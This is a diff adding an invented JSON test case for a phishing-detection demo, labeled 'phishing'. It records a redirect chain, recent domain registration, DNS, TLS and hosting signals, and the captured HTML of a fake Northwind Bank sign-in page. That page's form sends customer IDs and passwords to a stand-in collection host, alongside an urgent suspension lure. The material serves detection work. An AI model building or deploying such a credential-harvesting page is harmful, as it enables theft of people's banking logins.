@@ -1,0 +1,65 @@
+{
+  "case_id": "demo-bank-login",
+  "submission_type": "url",
+  "payload": "https://northwind-bank.account-verify.example/signin?session=8f3a91c2",
+  "label": "phishing",
+  "inapplicable": [
+    "message_body"
+  ],
+  "artifacts": [
+    {
+      "field": "url",
+      "content": "https://northwind-bank.account-verify.example/signin?session=8f3a91c2",
+      "instrument": "submission"
+    },
+    {
+      "field": "redirect_chain",
+      "content": "https://nwb-alerts.example/r/77 -> 302 -> https://northwind-bank.account-verify.example/signin?session=8f3a91c2",
+      "instrument": "headless_browser"
+    },
+    {
+      "field": "html",
+      "content": "<html><head><title>Northwind Bank | Sign in</title></head><body><img src=\"https://cdn.northwind-bank.example/logo.svg\"><form method=\"post\" action=\"https://collect-forms.example/nwb/post.php\"><input type=\"text\" name=\"user\" placeholder=\"Customer ID\"><input type=\"password\" name=\"pass\" placeholder=\"Password\"><button>Sign in</button></form><a href=\"#\">Forgot password?</a><a href=\"#\">Help</a></body></html>",
+      "instrument": "headless_browser"
+    },
+    {
+      "field": "dom",
+      "content": "<html><head><title>Northwind Bank | Sign in</title></head><body><img src=\"https://cdn.northwind-bank.example/logo.svg\"><form method=\"post\" action=\"https://collect-forms.example/nwb/post.php\"><input type=\"text\" name=\"user\" placeholder=\"Customer ID\"><input type=\"password\" name=\"pass\" placeholder=\"Password\"><button>Sign in</button></form><a href=\"#\">Forgot password?</a><a href=\"#\">Help</a></body></html>",
+      "instrument": "headless_browser"
+    },
+    {
+      "field": "page_content",
+      "content": "Northwind Bank. Unusual sign-in activity detected on your account. Your account will be suspended within 24 hours unless you verify your identity. Sign in with your Customer ID and password to continue.",
+      "instrument": "headless_browser"
+    },
+    {
+      "field": "dns",
+      "content": "A 203.0.113.10; no MX record",
+      "instrument": "dns_client"
+    },
+    {
+      "field": "registration",
+      "content": "registrable domain account-verify.example; created 2 days before observation; registrar privacy-protected",
+      "instrument": "registration_client"
+    },
+    {
+      "field": "tls",
+      "content": "DV certificate; issued 2 days before observation; valid 90 days",
+      "instrument": "tls_client"
+    },
+    {
+      "field": "ct",
+      "content": "certs_covering_host_valid_on_or_before_observation=1; first certificate for the host issued (2 days before observation)",
+      "instrument": "ct_client"
+    },
+    {
+      "field": "hosting",
+      "content": "shared hosting AS64496; 312 other domains on the same address",
+      "instrument": "hosting_client"
+    }
+  ],
+  "failures": {
+    "screenshot": "not_rendered_in_demo"
+  },
+  "note": "Invented case for the terminal demo. Reserved .example domains; no real page or brand."
+}
